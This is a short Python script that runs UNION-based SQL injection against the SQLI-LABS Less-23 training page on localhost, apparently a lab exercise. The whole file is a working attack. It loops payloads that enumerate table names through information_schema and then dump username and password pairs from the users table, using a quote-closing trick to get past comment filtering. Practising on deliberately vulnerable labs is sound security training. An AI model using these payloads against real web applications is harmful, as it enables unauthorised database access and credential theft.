# -*- coding: utf-8 -*-
import requests

main_url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-23/index.php"
for i in range(10):
    payload = "?id=-1' union select 1,(select table_name from information_schema.tables where table_schema=database(" \
              ")limit + " + str(i) + ",1),2 or '1' ='1 "
    url = main_url + payload
    response = requests.get(url)
    result = response.text
    result = result[570:]
    result = result[:result.find("<")]
    print(result)
    if result == "":
        break


for i in range(10):
    payload2 = "?id=-1' union select 1,(select group_concat(username, ' _ ', password) from users limit + " + str(
        i) + ",1),2 or '1' ='1"
    url = main_url + payload2
    response = requests.get(url)
    result = response.text
    result = result[570:]
    result = result[:result.find("<")]
    print(result)
    if result == "":
        break
